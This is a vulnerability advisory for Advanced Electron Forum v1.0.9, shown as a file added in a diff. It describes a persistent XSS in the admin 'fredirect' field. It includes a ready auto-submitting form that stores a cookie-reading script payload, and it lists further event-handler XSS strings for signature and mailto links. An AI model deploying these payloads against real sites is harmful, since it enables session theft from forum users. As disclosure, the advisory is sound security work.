@@ -1,0 +1,139 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AEF-XSS.txt
+
+
+Vendor:
+=============================
+www.anelectron.com/downloads/
+
+
+Product:
+====================================
+Advanced Electron Forum v1.0.9 (AEF)
+Exploit patched current version.
+
+
+Vulnerability Type:
+===================
+Persistent XSS
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+
+In Admin panel under Edit Boards / General Stuff / General Options
+
+There is an option to sepcify a redirect URL for the forum.
+
+See --> Redirect Forum:
+Enter a URL to which this forum will be redirected to.
+
+The redirect input field is vulnerable to a persistent XSS that will be
+stored in the MySQL database
+and execute attacker supplied client side code each time a victim visits
+the following URLs.
+
+http://localhost/AEF(1.0.9)_Install/index.php?
+
+http://localhost/AEF(1.0.9)_Install/index.php?act=admin&adact=forums&seadact=editforum&editforum=1
+
+
+
+Exploit code(s):
+===============
+
+Persistent XSS
+
+<form id="XSS-DE-PERSISTO" action="
+http://localhost/AEF(1.0.9)_Install/index.php?act=admin&adact=forums&seadact=editforum&editforum=1"
+method="post">
+<input type="hidden" name="editmother" value="c1" />
+<input type="hidden" name="forder" value="1" />
+<input type="hidden" name="fstatus" value="1" />
+<input type="hidden" name="fredirect" value='"/><script>alert("XSS
+hyp3rlinx \n\n" + document.cookie)</script>' />
+<input type="hidden" name="fimage" value="" />
+<input type="hidden" name="fname" value="Generals" />
+<input type="hidden" name="fdesc" value="hyp3rlinx" />
+<input type="hidden" name="ftheme" value="0" />
+<input type="hidden" name="frulestitle" value="MAYHEM" />
+<input type="hidden" name="frules" value="0" />
+<input type="hidden" name="rss" value="10" />
+<input type="hidden" name="rss_topic" value="0" />
+<input type="hidden" name="member[-1]" value="on" />
+<input type="hidden" name="member[0]" value="on" />
+<input type="hidden" name="member[3]" value="on" />
+<input type="hidden" name="inc_mem_posts" value="on" />
+<input type="hidden" name="allow_poll" value="on" />
+<input type="hidden" name="allow_html" value="on" />
+<input type="hidden" name="mod_posts" value="on" />
+<input type="hidden" name="editboard" value="Edit+Forum" />
+<script>document.getElementById('XSS-DE-PERSISTO').submit()</script>
+</form>
+
+
+
+Some other misc XSS(s) under 'Signature' area.
+
+
+http://localhost/AEF(1.0.9)_Install/index.php?act=usercp&ucpact=signature
+on Anchor link setting
+http://"onMouseMove="alert(0)
+
+AND
+
+http://localhost/AEF(1.0.9)_Install/index.php?act=usercp&ucpact=writepm
+email link:
+mailto:"onMouseMove="alert(1)
+
+
+
+Disclosure Timeline:
+=====================================
+Vendor Notification:  NA
+January 17, 2016  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+================
+High
+
+
+Description:
+=================================================================
+
+
+Request Method(s):        [+] POST
+
+
+Vulnerable Product:       [+] AEF v1.0.9 (exploit patched version)
+
+
+Vulnerable Parameter(s):  [+] 'fredirect'
+
+=================================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
